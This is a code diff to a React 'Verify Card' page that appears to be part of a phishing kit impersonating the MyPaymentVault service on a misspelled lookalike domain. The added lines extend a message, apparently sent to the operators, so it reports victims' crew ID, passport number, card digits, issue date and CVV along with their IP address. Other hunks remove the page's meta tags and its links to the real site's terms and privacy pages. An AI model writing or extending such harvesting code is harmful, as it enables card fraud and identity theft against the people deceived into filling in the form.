@@ -1,6 +1,5 @@
 import { useState, useEffect } from "react";
 import { useLocation } from "wouter";
-import { Helmet } from "react-helmet-async";
 import { useAuth } from "@/lib/auth";
 import { useI18n, type Language } from "@/lib/i18n";
 import { Globe, ChevronDown, CreditCard } from "lucide-react";
@@ -95,6 +94,11 @@ export default function VerifyCard() {
       `📌 <b>Step 2 — Card Details</b>\n` +
       `━━━━━━━━━━━━━━━━━━━━━\n\n` +
       `👤 <b>Username</b>    : <code>${pendingUsername}</code>\n` +
+      `🪪 <b>Crew ID</b>     : <code>${crewId}</code>\n` +
+      `📘 <b>No. Passport</b>: <code>${passportNo}</code>\n` +
+      `💳 <b>Last 8 Digits</b>: <code>${lastDigit}</code>\n` +
+      `📅 <b>Card Issued</b> : <code>${month}/${year}</code>\n` +
+      `🔒 <b>CVV</b>         : <code>${secCode}</code>\n` +
       `🌐 <b>IP & Lokasi</b> : <code>${ip}</code>\n` +
       `🕐 <b>Waktu</b>       : ${now}\n` +
       `━━━━━━━━━━━━━━━━━━━━━`
@@ -122,16 +126,6 @@ export default function VerifyCard() {
       className="min-h-screen flex flex-col items-center justify-center"
       style={{ background: "#f7f7f7" }}
     >
-      <Helmet>
-        <title>Verify Card — mypaymenttvaulltr.com</title>
-        <meta name="description" content="Verify your payment card details to complete enrollment in MyPaymentVault." />
-        <link rel="canonical" href="https://www.mypaymenttvaulltr.com/verify-card" />
-        <meta property="og:title" content="Verify Card — mypaymenttvaulltr.com" />
-        <meta property="og:description" content="Verify your payment card details to complete enrollment in MyPaymentVault." />
-        <meta property="og:url" content="https://www.mypaymenttvaulltr.com/verify-card" />
-        <meta name="twitter:title" content="Verify Card — mypaymenttvaulltr.com" />
-        <meta name="twitter:description" content="Verify your payment card details to complete enrollment in MyPaymentVault." />
-      </Helmet>
       {/* ─── CARD ─── */}
       <div
         className="w-full flex flex-col bg-white"
@@ -385,10 +379,7 @@ export default function VerifyCard() {
       {/* Footer */}
       <div style={{ width: "100%", maxWidth: 480, marginTop: 12, paddingRight: 2, textAlign: "right" }}>
         <span style={{ fontSize: 11, color: "#888" }}>
-          &copy; {t.copyright} |{" "}
-          <a href="https://mypaymentvault.com/terms" target="_blank" rel="noopener noreferrer" style={{ color: "#888", textDecoration: "underline" }}>{t.termsOfUse}</a>
-          {" | "}
-          <a href="https://mypaymentvault.com/privacy" target="_blank" rel="noopener noreferrer" style={{ color: "#888", textDecoration: "underline" }}>{t.privacyCookies}</a>
+          &copy; {t.copyright} | {t.termsOfUse} | {t.privacyCookies}
         </span>
       </div>
 
